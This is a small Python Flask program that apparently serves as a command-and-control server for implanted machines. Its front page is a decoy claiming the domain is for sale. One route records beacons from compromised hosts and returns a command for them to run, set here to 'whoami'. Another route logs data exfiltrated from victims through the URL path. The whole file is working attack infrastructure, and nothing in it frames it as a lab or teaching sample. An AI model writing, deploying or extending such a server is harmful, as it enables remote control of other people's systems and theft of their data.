from flask import Flask
app = Flask(__name__)


@app.route('/')
def root_dir():
    return_string = "Domain available for puchase <br \> <br \> Email     'administrator@nonewideas.com'     for more info"

    return return_string


@app.route('/conn/<hostname>/<username>')
@app.route('/conn/<hostname>/<username>/')
def new_connection(hostname, username):
    #cmd_file = open('command.txt')
    #command = cmd_file.readline()
    command = "whoami"

    print('[+] Beacon from: ', hostname, ' as ', username)

    if command != '':
        print('[+] Command sent to ', hostname, ' as ', username)
    else:
        pass

    return command


@app.route('/out/<hostname>/<exfil>')
@app.route('/out/<hostname>/<exfil>/')
def exfil_data(hostname, exfil):
    return_string = ''
    print('[i] Response from ', hostname, ": ", exfil)

    return return_string


def start_server():
    app.run(host = '0.0.0.0', debug=False, port=80)


if __name__ == '__main__':
    app.run(host = '0.0.0.0', debug=True, port=80)